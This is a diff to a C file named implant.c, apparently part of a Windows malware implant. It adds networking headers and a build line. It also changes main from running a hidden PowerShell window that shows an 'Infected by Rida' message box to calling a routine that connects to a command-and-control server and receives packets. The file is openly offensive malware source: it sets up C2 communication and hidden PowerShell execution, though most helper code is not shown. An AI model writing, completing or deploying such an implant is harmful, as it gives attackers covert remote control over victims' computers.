@@ -1,9 +1,12 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <winternl.h>
+#include <winsock2.h>
 #include <windows.h>
 #include <wininet.h>
-#include <winternl.h>
 #include <tlhelp32.h>
+#include <ws2tcpip.h>
+#include <windows.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -13,7 +16,7 @@
 #pragma comment(lib, "wininet.lib")
 
 /*
-	gcc .\implant.c .\helper.c .\Attacks\ExecutePosershell.c -o .\implant.exe -lwininet
+	gcc .\implant.c .\helper.c .\Attacks\ExecutePowershell.c -o .\implant.exe -lwininet -lws2_32
 */
 
 LPCSTR host = "127.0.0.1"; 
@@ -38,6 +41,7 @@ BOOL receiveC2Packet(PC2_PACKET receivedPacket){
     c2Address.sin_port = htons(port);
     inet_pton(AF_INET, host, &c2Address.sin_addr);
 
+
     printf("[C2] Connecting to C2 (%s:%d)\n", host, port);
     connect(c2Socket, (struct sockaddr*)&c2Address, sizeof(c2Address));
 
@@ -60,10 +64,10 @@ BOOL receiveC2Packet(PC2_PACKET receivedPacket){
 }
 
 int main() {
-    ExecPowerShell(L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Infected by Rida','Mouahahaha')\"");
+    //ExecPowerShell(L"powershell.exe -NoProfile -WindowStyle Hidden -Command \"Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Infected by Rida','Mouahahaha')\"");
 
-    //PC2_PACKET pkt = calloc(1, sizeof(C2_PACKET));
-    //receiveC2Packet(pkt);
+    PC2_PACKET pkt = calloc(1, sizeof(C2_PACKET));
+    receiveC2Packet(pkt);
 
     return 0;
 }
